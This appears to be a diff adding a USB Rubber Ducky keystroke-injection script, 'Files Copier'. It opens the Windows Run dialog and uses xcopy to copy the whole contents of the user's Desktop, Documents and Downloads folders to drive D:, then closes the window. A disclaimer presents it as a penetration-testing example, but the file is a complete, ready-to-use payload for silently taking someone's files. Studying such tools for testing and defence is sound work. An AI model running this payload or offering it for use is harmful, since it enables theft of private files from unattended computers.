@@ -1,0 +1,17 @@
+REM GitHub, it's Users, Owners, and I claim no responsibility as to how you use the script, a USB Rubber Ducky is meant for penetration testers and this script is provided as an example of its capabilities. Use at your own risk.
+REM Script: Files Copier
+REM Author: ItzEdInYourBed
+REM Purpose: Copy files from desktop, documents, and downloads folders to D: drive
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /c xcopy "%userprofile%\Desktop\*.*" D:\ /s /y
+ENTER
+DELAY 500
+STRING cmd /c xcopy "%userprofile%\Documents\*.*" D:\ /s /y
+ENTER
+DELAY 500
+STRING cmd /c xcopy "%userprofile%\Downloads\*.*" D:\ /s /y
+ENTER
+DELAY 500
+ALT F4
